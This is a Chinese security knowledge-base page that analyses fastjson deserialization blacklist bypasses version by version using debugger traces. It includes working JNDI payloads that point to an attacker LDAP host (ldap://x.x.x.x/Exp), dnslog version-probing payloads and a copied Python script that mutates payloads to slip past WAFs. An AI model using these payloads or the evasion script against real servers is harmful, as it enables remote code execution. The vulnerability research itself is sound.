利用的前提是必须要手动开启autoTypeSupport，不然还是不能利用，所以说还是有一点鸡肋吧 从代码中开启autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 在1.2.25之后的版本，以及所有的.sec01后缀版本中，增加了checkAutotype函数，autotype功能默认是受限的（黑白名单机制） 但在1.2.25到1.2.41之间，发生过一次checkAutotype的绕过。 Payload如下 {\"@type\":\"Lorg.example.User;\",\"age\":66,\"username\":\"test\"} 我们用这个payload来分析一下如何绕过的（fastjson 1.2.41） 进入checkAutoType后，首先会对typeName的长度进行判断，很明显这个条件满足不了，所以不会抛出异常 继续向下，开启autoTypeSupport时，会先通过黑白名单来判断，先白名单后黑名单 很明显我们传入的typeName Lorg.example.User;肯定是不在黑名单内的，这是一个绕过的点 继续向下，如果clazz==null，就会调用TypeUtils.getClassFromMapping(typeName);，跟一下其实就是从一个ConcurrentHashMap中看看存不存在这个类，很明显我们传入的L开头的类是不会存在的 继续向下，和上面类似，我们这个类还是找不到的，所以clazz还是null 没开启autoTypeSupport的情况下，依然会进行黑白名单检测，先黑名单后白名单，我们这里手动开启了所以这里不管，因为会跳过 前面黑名单检测都没问题，就会开始加载这个类了 跟进loadClass，如果第一个字符是[，就会去掉[再去解析，我们这里不满足就先不看，继续向下 这个条件就是这次绕过的核心条件了 else if (className.startsWith(\"L\") && className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } 如果开头是L而且结尾是;，那么就会给前后这俩字符去掉，所以可以看到我们的newClassName就是我们想要的org.example.User 后续就会加载我们的类实例化，达到我们绕过的目的 debug过程中，可能大家注意到一个点，loadClass函数中，有一个条件，如果第一个字符是[，就会去掉[再去实例化，那这个地方是不是也能用来绕过呢？ 答案是当然可以，这个绕过点就体现在1.2.43版本中 fastjson 1.2.42 1.2.41问题出现后，1.2.42中尝试了修复，修复方式 https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf 寻找历史commit技巧： release里面找对应的版本的commit 直接搜索commit 直接搜索issue 可以明显的看到，给原来的denyList变成了denyHashCodes，让安全研究更难了，但是hashcode的方法是公开的，只要jar包够多还是可以碰撞出来的，感觉治标不治本。。。 同时可以看到针对漏洞绕过的修复方式，很简单粗暴，如果发现开头是L而且结尾是;，就直接去掉 所以绕过方式也很简单，直接用2个L和2个;就可以了，Payload如下 {\"@type\":\"LLorg.example.User;;\",\"age\":66,\"username\":\"test\"} fastjson 1.2.43 对LL;;可以绕过的情况做了过滤，如果只有一个L;，就去除了后再走黑名单去过滤看看是否允许反序列化，着实太恶心了看着 所以2个LL;;是行不通了，但是别忘了我们在分析1.2.41的时候，发现还会去掉[然后实例化，这就是绕过点 初始payload {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"} 报错exepct '[', but ,, pos 29, json : {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"}，29那个位置，期望一个[，但是是,，所以我们加一个[ {\"@type\":\"[org.example.User\"[,\"age\":66,\"username\":\"test\"} 报错syntax error, expect {, actual string, pos 30, fastjson-version 1.2.43，期望30的位置是一个{，加上 最终POC {\"@type\":\"[org.example.User\"[{,\"age\":66,\"username\":\"test\"} 看着有点迷，为啥加上[{就可以了？ 分析一下，通过checkAutoType后，返回class [Lorg.example.User; 一直跟，发现调用了deserializer.deserialze，跟进去，发现使用了clazz.getComponentType()，是不是很眼熟？就是前面去掉[的那个地方 这个函数是native的，所以看不到代码。。。不过根据结果来看，就是去掉[L和;拿到类 再继续往下，跟进parseArray 发现如果token != 14就会抛出错误，而没有[的时候，token是16，所以会报错，{也类似，可以下个异常断点来分析 最后看下到setXXX的运行堆栈信息，结合堆栈来分析可以节约很多时间 setUsername:20, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseArray:729, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:183, ObjectArrayCodec (com.alibaba.fastjson.serializer) parseObject:373, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1338, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1304, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:10, App (org.example) fastjson 1.2.45 1.2.44中对[进行了判断，我们用1.2.43的POC，然后下个JSONException的异常断点，看看是怎么判断的 运行后，在com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)成功拦截 分析一下，发现如果开头是[就直接抛出异常 那再看看1.2.41里面的绕法呢，前面加个L，后面加个;，发现会检查结尾是否为;，是的话也抛出异常 当然这个版本既然有RCE，肯定不是之前的方法绕过的，这次是通过不在黑名单里面的类来绕过的 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://x.x.x.x/Exp\"}} fastjson 1.2.47 这个版本绕过了autoTypeSupport检测，不开启ast依然可以利用（1.2.25 - 1.2.45 这些绕过都是需要开启ast的） Payload： { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"org.example.User\" }, \"b\": { \"@type\": \"org.example.User\", \"username\": \"123456\", \"age\": 123 } } 绕过原理： 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过 这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中 如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回 debug分析： 在setXXX的地方下断点，运行看下调用堆栈信息 setUsername:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1078, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:20, App (org.example) 进入到parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)开始下断点重新运行分析 跟进，一直F8，识别到传入的参数a，继续向下，识别到后面还是{开头后，递归调用parseObject 继续往后识别到@type 然后就是进入checkAutoType检查，因为java.lang.Class在this.deserializers.buckets里面，所以直接返回了class java.lang.Class 通过了checkAutoType检查后，常规调用deserializer.deserialze进行反序列化，但这里是com.alibaba.fastjson.serializer.MiscCodec#deserialze 这里会取出我们的变量val的值，也是我们传入的恶意类 然后就是一系列的Class的判断，一直到Class.class，然后会进入loadClass 跟进loadClass，一直跟，发现在cache为true的时候，会直接给咱们的恶意类加入到mappings中，而这个mappings是不是看着很眼熟？后面分析 这个cache默认就是为true 然后开始处理字段b，和上面类似，我们一直到checkAutoType 可以看到此处如果开启了autoTypeSupport检查会进入黑名单检查，反而影响我们的payload 跟进下方的getClassFromMapping，可以看到就是上面我们添加恶意类的那个Mapping，从此绕过了checkAutoType检查 到此差不多就结束了，大佬就是大佬，太牛了 fastjson 1.2.62 1.2.47后肯定修复了，怎么修的呢？我们用1.2.62去试试1.2.47的POC 抛出了一场，然后下个异常断点，分析一下，看样子是前面某个地方设置了autoTypeSupport的值 咱们追踪一下这个变量，下个字段断点 发现来源是这 跟一下AUTO_SUPPORT，原来是从配置文件里面读是否开启了autoTypeSupport。。。大意了 那我们开启ast后再试试 结果就是java.lang.Class被加入到了黑名单 据说修复还将cache默认设置为false了，去TypeUtils类看看，发现确实如此 1.2.62的RCE也很简单，由于CVE-2020-8840的gadget绕过了fastjson的黑名单而导致的，当服务端存在收到漏洞影响的xbean-reflect依赖并且开启fastjson的autotype时，远程攻击者可以通过精心构造的请求包触发漏洞从而导致在服务端上造成远程命令执行的效果。 {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.66 和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题 {\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.68 这个文档太大了太卡了，后面单独分析 fastjson黑名单 参考https://github.com/LeadroyaL/fastjson-blacklist fastjson 在1.2.42开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。在 https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd 这次commit中体现出来。 fastjson 在1.2.61开始，在https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38中，把黑名单从十进制数变成了十六进制数，可能是为了防止安全研究者进行搜索 对照表 version hash hex-hash name 1.2.42 -8720046426850100497 0x86fc2bf9beaf7aefL org.apache.commons.collections4.comparators 1.2.42 -8109300701639721088 0x8f75f9fa0df03f80L org.python.core 1.2.42 -7966123100503199569 0x9172a53f157930afL org.apache.tomcat 1.2.42 -7766605818834748097 0x9437792831df7d3fL org.apache.xalan 1.2.42 -6835437086156813536 0xa123a62f93178b20L javax.xml 1.2.42 -4837536971810737970 0xbcdd9dc12766f0ceL org.springframework. 1.2.42 -4082057040235125754 0xc7599ebfe3e72406L org.apache.commons.beanutils 1.2.42 -2364987994247679115 0xdf2ddff310cdb375L org.apache.commons.collections.Transformer 1.2.42 -1872417015366588117 0xe603d6a51fad692bL org.codehaus.groovy.runtime 1.2.42 -254670111376247151 0xfc773ae20c827691L java.lang.Thread 1.2.42 -190281065685395680 0xfd5bfc610056d720L javax.net. 1.2.42 313864100207897507 0x45b11bc78a3aba3L com.mchange 1.2.42 1203232727967308606 0x10b2bdca849d9b3eL org.apache.wicket.util 1.2.42 1502845958873959152 0x14db2e6fead04af0L java.util.jar. 1.2.42 3547627781654598988 0x313bb4abd8d4554cL org.mozilla.javascript 1.2.42 3730752432285826863 0x33c64b921f523f2fL java.rmi 1.2.42 3794316665763266033 0x34a81ee78429fdf1L java.util.prefs. 1.2.42 4147696707147271408 0x398f942e01920cf0L com.sun. 1.2.42 5347909877633654828 0x4a3797b30328202cL java.util.logging. 1.2.42 5450448828334921485 0x4ba3e254e758d70dL org.apache.bcel 1.2.42 5751393439502795295 0x4fd10ddc6d13821fL java.net.Socket 1.2.42 5944107969236155580 0x527db6b46ce3bcbcL org.apache.commons.fileupload 1.2.42 6742705432718011780 0x5d92e6ddde40ed84L org.jboss 1.2.42 7179336928365889465 0x63a220e60a17c7b9L org.hibernate 1.2.42 7442624256860549330 0x6749835432e0f0d2L org.apache.commons.collections.functors 1.2.42 8838294710098435315 0x7aa7ee3627a19cf3L org.apache.myfaces.context.servlet 1.2.43 -2262244760619952081 0xe09ae4604842582fL java.net.URL 1.2.46 -8165637398350707645 0x8eadd40cb2a94443L junit. 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 1.2.46 -7921218830998286408 0x92122d710e364fb8L org.osjava.sj. 1.2.46 -7768608037458185275 0x94305c26580f73c5L org.apache.log4j. 1.2.46 -6179589609550493385 0xaa3daffdb10c4937L org.logicalcobwebs. 1.2.46 -5194641081268104286 0xb7e8ed757f5d13a2L org.apache.logging. 1.2.46 -3935185854875733362 0xc963695082fd728eL org.apache.commons.dbcp 1.2.46 -2753427844400776271 0xd9c9dbf6bbd27bb1L com.ibatis.sqlmap.engine.datasource 1.2.46 -1589194880214235129 0xe9f20bad25f60807L org.jdom. 1.2.46 1073634739308289776 0xee6511b66fd5ef0L org.slf4j. 1.2.46 5688200883751798389 0x4ef08c90ff16c675L javassist. 1.2.46 7017492163108594270 0x616323f12c2ce25eL oracle.net 1.2.46 8389032537095247355 0x746bd4a53ec195fbL org.jaxen. 1.2.48 1459860845934817624 0x144277b467723158L java.net.InetAddress 1.2.48 8409640769019589119 0x74b50bb9260e31ffL java.lang.Class 1.2.49 4904007817188630457 0x440e89208f445fb9L com.alibaba.fastjson.annotation 1.2.59 5100336081510080343 0x46c808a4b5841f57L org.apache.cxf.jaxrs.provider. 1.2.59 6456855723474196908 0x599b5c1213a099acL ch.qos.logback. 1.2.59 8537233257283452655 0x767a586a5107feefL net.sf.ehcache.transaction.manager. 1.2.60 3688179072722109200 0x332f0b5369a18310L com.zaxxer.hikari. 1.2.61 -4401390804044377335 0xc2eb1e621f439309L flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor 1.2.61 -1650485814983027158 0xe9184be55b1d962aL org.apache.openjpa.ee. 1.2.61 -1251419154176620831 0xeea210e8da2ec6e1L oracle.jdbc.rowset.OracleJDBCRowSet 1.2.61 -9822483067882491 0xffdd1a80f1ed3405L com.mysql.cj.jdbc.admin. 1.2.61 99147092142056280 0x1603dc147a3e358L oracle.jdbc.connector.OracleManagedConnectionFactory 1.2.61 3114862868117605599 0x2b3a37467a344cdfL org.apache.ibatis.parsing. 1.2.61 4814658433570175913 0x42d11a560fc9fba9L org.apache.axis2.jaxws.spi.handler. 1.2.61 6511035576063254270 0x5a5bd85c072e5efeL jodd.db.connection. 1.2.61 8925522461579647174 0x7bddd363ad3998c6L org.apache.commons.configuration.JNDIConfiguration 1.2.62 -9164606388214699518 0x80d0c70bcc2fea02L org.apache.ibatis.executor. 1.2.62 -8649961213709896794 0x87f52a1b07ea33a6L net.sf.cglib. 1.2.62 -6316154655839304624 0xa85882ce1044c450L oracle.net. 1.2.62 -5764804792063216819 0xafff4c95b99a334dL com.mysql.cj.jdbc.MysqlDataSource 1.2.62 -4608341446948126581 0xc00be1debaf2808bL jdk.internal. 1.2.62 -4438775680185074100 0xc2664d0958ecfe4cL aj.org.objectweb.asm. 1.2.62 -3319207949486691020 0xd1efcdf4b3316d34L oracle.jdbc. 1.2.62 -2192804397019347313 0xe1919804d5bf468fL org.apache.commons.collections.comparators. 1.2.62 -2095516571388852610 0xe2eb3ac7e56c467eL net.sf.ehcache.hibernate. 1.2.62 4750336058574309 0x10e067cd55c5e5L com.mysql.cj.log. 1.2.62 218512992947536312 0x3085068cb7201b8L org.h2.jdbcx. 1.2.62 823641066473609950 0xb6e292fa5955adeL org.apache.commons.logging. 1.2.62 1534439610567445754 0x154b6cb22d294cfaL org.apache.ibatis.reflection. 1.2.62 1818089308493370394 0x193b2697eaaed41aL org.h2.server. 1.2.62 2164696723069287854 0x1e0a8c3358ff3daeL org.apache.ibatis.datasource. 1.2.62 2653453629929770569 0x24d2f6048fef4e49L org.objectweb.asm. 1.2.62 2836431254737891113 0x275d0732b877af29L flex.messaging.util.concurrent. 1.2.62 3089451460101527857 0x2adfefbbfe29d931L org.apache.ibatis.javassist. 1.2.62 3256258368248066264 0x2d308dbbc851b0d8L java.lang.UNIXProcess 1.2.62 3718352661124136681 0x339a3e0b6beebee9L org.apache.ibatis.ognl. 1.2.62 4046190361520671643 0x3826f4b2380c8b9bL com.mysql.cj.jdbc.MysqlConnectionPoolDataSource 1.2.62 4841947709850912914 0x43320dc9d2ae0892L org.codehaus.jackson. 1.2.62 6280357960959217660 0x5728504a6d454ffcL org.apache.ibatis.scripting. 1.2.62 6534946468240507089 0x5ab0cb3071ab40d1L org.apache.commons.proxy. 1.2.62 6734240326434096246 0x5d74d3e5b9370476L com.mysql.cj.jdbc.MysqlXADataSource 1.2.62 7123326897294507060 0x62db241274397c34L org.apache.commons.collections.functors. 1.2.62 8488266005336625107 0x75cc60f5871d0fd3L org.apache.commons.configuration 1.2.66 -2439930098895578154 0xde23a0809a8b9bd6L javax.script. 1.2.66 -582813228520337988 0xf7e96e74dfa58dbcL javax.sound. 1.2.66 -26639035867733124 0xffa15bf021f1e37cL javax.print. 1.2.66 386461436234701831 0x55cfca0f2281c07L javax.activation. 1.2.66 1153291637701043748 0x100150a253996624L javax.tools. 1.2.66 1698504441317515818L 0x17924cca5227622aL javax.management. 1.2.66 7375862386996623731L 0x665c53c311193973L org.apache.xbean. 1.2.66 7658177784286215602L 0x6a47501ebb2afdb2L org.eclipse.jetty. 1.2.66 8055461369741094911L 0x6fcabf6fa54cafffL javax.naming. 1.2.67 -7775351613326101303L 0x941866e73beff4c9L org.apache.shiro.realm. 1.2.67 -6025144546313590215L 0xac6262f52c98aa39L org.apache.http.conn. 1.2.67 -5939269048541779808L 0xad937a449831e8a0L org.quartz. 1.2.67 -5885964883385605994L 0xae50da1fad60a096L com.taobao.eagleeye.wrapper 1.2.67 -3975378478825053783L 0xc8d49e5601e661a9L org.apache.http.impl. 1.2.67 -2378990704010641148L 0xdefc208f237d4104L com.ibatis. 1.2.67 -905177026366752536L 0xf3702a4a5490b8e8L org.apache.catalina. 1.2.67 2660670623866180977L 0x24ec99d5e7dc5571L org.apache.http.auth. 1.2.67 2731823439467737506L 0x25e962f1c28f71a2L br.com.anteros. 1.2.67 3637939656440441093L 0x327c8ed7c8706905L com.caucho. 1.2.67 4254584350247334433L 0x3b0b51ecbf6db221L org.apache.http.cookie. 1.2.67 5274044858141538265L 0x49312bdafb0077d9L org.javasimon. 1.2.67 5474268165959054640L 0x4bf881e49d37f530L org.apache.cocoon. 1.2.67 5596129856135573697L 0x4da972745feb30c1L org.apache.activemq.jms.pool. 1.2.67 6854854816081053523L 0x5f215622fb630753L org.mortbay.jetty. 1.2.68 -3077205613010077203L 0xd54b91cc77b239edL org.apache.shiro.jndi. 1.2.68 -2825378362173150292L 0xd8ca3d595e982bacL org.apache.ignite.cache.jta. 1.2.68 2078113382421334967L 0x1cd6f11c6a358bb7L javax.swing.J 1.2.68 6007332606592876737L 0x535e552d6f9700c1L org.aoju.bus.proxy.provider. 1.2.68 9140390920032557669L 0x7ed9311d28bf1a65L java.awt.p 1.2.68 9140416208800006522L 0x7ed9481d28bf417aL java.awt.i 1.2.69 -8024746738719829346L 0x90a25f5baa21529eL java.io.Serializable 1.2.69 -5811778396720452501L 0xaf586a571e302c6bL java.io.Closeable 1.2.69 -3053747177772160511L 0xd59ee91f0b09ea01L oracle.jms.AQ 1.2.69 -2114196234051346931L 0xe2a8ddba03e69e0dL java.util.Collection 1.2.69 -2027296626235911549L 0xe3dd9875a2dc5283L java.lang.Iterable 1.2.69 -2939497380989775398L 0xd734ceb4c3e9d1daL java.lang.Object 1.2.69 -1368967840069965882L 0xed007300a7b227c6L java.lang.AutoCloseable 1.2.69 2980334044947851925L 0x295c4605fd1eaa95L java.lang.Readable 1.2.69 3247277300971823414L 0x2d10a5801b9d6136L java.lang.Cloneable 1.2.69 5183404141909004468L 0x47ef269aadc650b4L java.lang.Runnable 1.2.69 7222019943667248779L 0x6439c4dff712ae8bL java.util.EventListener 1.2.70 -5076846148177416215L 0xb98b6b5396932fe9L org.apache.commons.collections4.Transformer 1.2.70 -4703320437989596122L 0xbeba72fb1ccba426L org.apache.commons.collections4.functors 1.2.70 -4314457471973557243L 0xc41ff7c9c87c7c05L org.jdom2.transform. 1.2.70 -2533039401923731906L 0xdcd8d615a6449e3eL org.apache.hadoop.shaded.com.zaxxer.hikari. 1.2.70 156405680656087946L 0x22baa234c5bfb8aL com.p6spy.engine. 1.2.70 1214780596910349029L 0x10dbc48446e0dae5L org.apache.activemq.pool. 1.2.70 3085473968517218653L 0x2ad1ce3a112f015dL org.apache.aries.transaction. 1.2.70 3129395579983849527L 0x2b6dd8b3229d6837L org.apache.activemq.ActiveMQConnectionFactory 1.2.70 4241163808635564644L 0x3adba40367f73264L org.apache.activemq.spring. 1.2.70 7240293012336844478L 0x647ab0224e149ebeL org.apache.activemq.ActiveMQXAConnectionFactory 1.2.70 7347653049056829645L 0x65f81b84c1d920cdL org.apache.commons.jelly. 1.2.70 7617522210483516279L 0x69b6e0175084b377L org.apache.axis2.transport.jms. 1.2.71 -4537258998789938600L 0xc1086afae32e6258L java.io.FileReader 1.2.71 -4150995715611818742L 0xc664b363baca050aL java.io.ObjectInputStream 1.2.71 -2995060141064716555L 0xd66f68ab92e7fef5L java.io.FileInputStream 1.2.71 -965955008570215305L 0xf2983d099d29b477L java.io.ObjectOutputStream 1.2.71 -219577392946377768L 0xfcf3e78644b98bd8L java.io.DataOutputStream 1.2.71 2622551729063269307L x24652ce717e713bbL java.io.PrintWriter 1.2.71 2930861374593775110L 0x28ac82e44e933606L java.io.Buffered 1.2.71 4000049462512838776L 0x378307cb0111e878L java.io.InputStreamReader 1.2.71 4193204392725694463L 0x3a31412dbb05c7ffL java.io.OutputStreamWriter 1.2.71 5545425291794704408L 0x4cf54eec05e3e818L java.io.FileWriter 1.2.71 6584624952928234050L 0x5b6149820275ea42L java.io.FileOutputStream 1.2.71 7045245923763966215L 0x61c5bdd721385107L java.io.DataInputStream Payload转换 有些使用了存在漏洞的fastjson版本，但是有WAF在外面，所以抄了一个师傅的脚本 #!usr/bin/env python # -*- coding:utf-8 -*- \"\"\" @author: longofo @file: fastjson_fuzz.py @time: 2020/05/07 \"\"\" import json from json import JSONDecodeError class FastJsonPayload: def __init__(self, base_payload): try: json.loads(base_payload) except JSONDecodeError as ex: raise ex self.base_payload = base_payload def gen_common(self, payload, func): tmp_payload = json.loads(payload) dct_objs = [tmp_payload] while len(dct_objs) > 0: tmp_objs = [] for dct_obj in dct_objs: for key in dct_obj: if key == \"@type\": dct_obj[key] = func(dct_obj[key]) if type(dct_obj[key]) == dict: tmp_objs.append(dct_obj[key]) dct_objs = tmp_objs return json.dumps(tmp_payload) # 对@type的value增加L开头，;结尾的payload def gen_payload1(self, payload: str): return self.gen_common(payload, lambda v: \"L\" + v + \";\") # 对@type的value增加LL开头，;;结尾的payload def gen_payload2(self, payload: str): return self.gen_common(payload, lambda v: \"LL\" + v + \";;\") # 对@type的value进行\\u def gen_payload3(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\u{:04x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # 对@type的value进行\\x def gen_payload4(self, payload: str): return self.gen_common(payload, lambda v: ''.join('\\\\x{:02x}'.format(c) for c in v.encode())).replace(\"\\\\\\\\\", \"\\\\\") # 生成cache绕过payload def gen_payload5(self, payload: str): cache_payload = { \"rand1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" } } cache_payload[\"rand2\"] = json.loads(payload) return json.dumps(cache_payload) def gen(self): payloads = [] payload1 = self.gen_payload1(self.base_payload) yield payload1 payload2 = self.gen_payload2(self.base_payload) yield payload2 payload3 = self.gen_payload3(self.base_payload) yield payload3 payload4 = self.gen_payload4(self.base_payload) yield payload4 payload5 = self.gen_payload5(self.base_payload) yield payload5 payloads.append(payload1) payloads.append(payload2) payloads.append(payload5) for payload in payloads: yield self.gen_payload3(payload) yield self.gen_payload4(payload) if __name__ == '__main__': fjp = FastJsonPayload('''{ \"rand1\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://localhost:1389/Object\", \"autoCommit\": true } }''') for payload in fjp.gen(): print(payload) print() Fastjson姿势技巧集合 https://github.com/safe6Sec/Fastjson 做个备份，怕删了 # Fastjson Fastjson姿势技巧集合 ## 说明 2021.8.10 小弟水平有限，1.2.48之后高版本漏洞成因还未进行研究探索，很多利用细节和注意事项都不够完整，待我有空慢慢补充。 ## 探测 用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。 fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。 主要是利用各个类被加入黑名单的方式进行判断 fastjson >1.2.43 ```java {\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} ``` fastjson >1.2.48 ```java {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog\"} ``` fastjson >1.2.68 ```java {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://dnslog\"}}\"\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}:0 ``` ## 各版本利用 除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。 JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本 参考链接 Fastjson系列三——历史版本补丁绕过（需开启AutoType） Fastjson反序列化漏洞分析 Fastjson 反序列化漏洞史 FastJson 反序列化学习 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/07.Fastjson1.2.68分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/07.Fastjson1.2.68分析.html","title":"07.Fastjson1.2.68分析","keywords":"","body":" 前言 分析1 分析2 ThrowableDeserializer 分析 利用 JavaBeanDeserializer 分析 利用 AutoCloseable深入使用 小知识1 小知识2 好坑 知识点3 利用链挖掘 链利用 Mysql JDBC RCE mysql 5.1.x >= 5.1.11 Mysqlconnector 6.0.2 or 6.0.3 Mysqlconnector 6.x or commons-io文件读取 commons-io2.x文件写入 总结 参考链接 前言 1.2.68有safeMode，但是默认不是开启的，所以还是有风险 分析1 根据网上信息的描述，这次问题点主要是在checkAutoType参数期望类这个地方 看看哪些地方会调用checkAutoType方法并使用到期望类这个参数 发现主要是2个地方会使用到 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze 那哪些地方会使用到这两个类的对应的deserialze方法呢？ 发现这个地方刚好是常规的@type进行checkAutoType检查后进行反序列化的时候会调用到； 先构造反序列化器，也就是说如果我们@type的值对应的类构造的反序列化器是JavaBeanDeserializer或者ThrowableDeserializer，就会触发deserialze，同时有希望触发带有期望类参数的checkAutoType达到我们的目的 总结成一句话就是：寻找怎么才能调用到带有expectClass参数的checkAutoType方法 分析2 那这俩个反序列化器是怎么构造出来的呢？ 我们跟一下config.getDeserializer(clazz) 重载，经过一系列的各种class的判断，到了这 如果clazz是Throwable的子类，那么就返回ThrowableDeserializer 如果所有条件都不满足，那么就会调用createJavaBeanDeserializer去新建JavaBeanDeserializer 跟进新建函数，发现是接口的情况，asmEnable为false，可以创建javaBeanDeserializer对象，否则调用的asmFactory.createJavaBeanDeserializer进行创建，不是我们想要的 ThrowableDeserializer 分析 要使用到com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer这个反序列化器，根据上面的分析，那么我们@type传入的就应该是Throwable的子类 所以poc（这里就直接用的他本身了） 因为java.lang.Throwable不在mapping和可信任的map中，所以这里要手动开启autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); {\"@type\":\"java.lang.Throwable\", \"a\":\"b\"} 运行，跟，可以看到这个时候我们的反序列化器deserializer确实是我们预计的ThrowableDeserializer类 进入deserialize，然后一直F8，发现payload后续参数满足条件键值对的键是@type，就可以调用带有期望类参数的checkAutoType 所以修改一下payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"org.example.App\"} 然后跟到刚才的地方 key为@type，exClass为我们输入的@type对应的值org.example.App，进入checkAutoType（期望类为Throwable.class，平时一般为null） 通过各种黑白名单的检查，一直到这，loadClass（因为这里开启了autoTypeSupport，所以cacheClass为true） 跟进看看，其实就是给它加到mapping中 再返回到checkAutoType继续往下，如果传入的clazz是期望类的子类，就通过autoType检查返回clazz 也就是说，我们的第二个@type对应的类必须是期望类java.lang.Throwable的子类，我们这里是自己随便写的一个类明显不是Throwable的子类，会抛出异常，所以找一个它的子类改一下payload {\"@type\":\"java.lang.Throwable\", \"@type\":\"java.lang.Error\"} 运行到刚才的地方，成功返回clazz 如果payload中还有其他的参数，关键参数如message会被用作后续的构造函数的参数等，otherValues就是传入的其他参数，比如\"a\":\"b\"这种，在创建实例后会进行setValue操作 再往后就是创建一个实例，用上刚才传入的参数啥的 跟进就是通过反射获取构造函数再创建实例 有参数的情况下会执行setValue操作，也就是会调用setXXX方法 利用 通过上述的分析，开启ast的情况下，如果我们能找到一个java.lang.Throwable的子类，且其的setter或者getter能执行危险操作，就有可利用的嫌疑 限定了可以利用的类必须是Throwable的子类，不过异常类很少使用高危函数。。。所以很鸡肋吧 